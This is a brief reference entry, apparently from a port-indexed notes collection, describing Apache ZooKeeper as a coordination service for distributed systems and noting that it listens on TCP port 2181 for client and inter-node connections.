# 2181 - ZooKeeper

Apache ZooKeeper is a centralized service designed to manage configuration, naming, synchronization, and coordination in distributed systems. It helps multiple nodes in a cluster maintain consistent state and coordinate actions, ensuring reliability and fault tolerance in complex environments. By default, ZooKeeper listens on TCP port `2181`, which is used for client connections to the service and inter-node communication within the cluster.
